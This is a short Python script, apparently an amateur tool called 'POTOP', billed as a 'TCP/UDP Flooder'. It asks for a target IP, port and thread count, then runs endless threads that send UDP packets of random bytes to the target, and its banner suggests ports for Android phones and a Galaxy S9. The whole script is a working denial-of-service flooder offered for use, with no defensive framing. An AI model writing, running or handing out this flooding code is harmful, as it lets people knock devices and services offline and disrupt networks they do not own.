import socket
import random
from threading import Thread
import threading
import bcolors
import pyfiglet

ascii_banner = pyfiglet.figlet_format("POTOP")
print(bcolors.BOLD + bcolors.HEADER + ascii_banner)
print("TCP/UDP Flooder made by: xxSlothAIxx")
print("=======================================================")
print(bcolors.BOLD + "PORT OPTIONS")
print("Port 6 for Android devices")
print("Port 80 for http on local network")
print("Port 0-65535 for galaxy s9")
print("=======================================================")
print("\n")

bytes = random._urandom(1024)

ip = raw_input("Enter your ip: ")
port = raw_input("Enter PORT:")
threads = raw_input("Enter amount of threads: ")

udp_threads = []

class UDPThread(Thread):

	def __init__(self, ip, port):
		Thread.__init__(self)
		self.ip = ip
		self.port = port

	def run(self):
		while True:
			udpclient = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			try:
				for x in range(0, 1000):
					udpclient.sendto(bytes, (ip, int(port)))
				print('UDP CONNECTED:  %s' % self.ip)
			except:
				print('[*] Error ')

for _ in range(0, int(threads)):
	uthread = UDPThread(ip, port)
	uthread.start()
	udp_threads.append(uthread)

for udp_thread in udp_threads:
	udp_thread.join()